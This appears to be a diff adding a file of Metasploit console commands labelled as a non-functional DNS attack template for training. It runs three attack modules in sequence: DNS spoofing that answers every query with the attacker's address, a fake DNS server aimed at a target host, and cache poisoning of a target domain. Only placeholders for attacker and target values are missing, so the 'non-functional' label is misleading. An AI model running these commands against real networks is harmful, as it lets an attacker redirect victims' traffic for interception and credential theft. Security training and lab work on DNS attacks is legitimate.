@@ -1,0 +1,19 @@
+# DNS Attack Templates
+# For Training Use – Non-functional Template
+
+use auxiliary/spoof/dns/native_spoof
+set INTERFACE eth0
+set SPOOFIP <LHOST>
+set REGEX .*
+run
+
+use auxiliary/server/fakedns
+set SRVHOST <LHOST>
+set TARGETHOST <TARGET_IP>
+set SPOOFIP <LHOST>
+run -j
+
+use auxiliary/spoof/dns/bailiwicked_host
+set SRCIP <LHOST>
+set FILTER <TARGET_DOMAIN>
+run
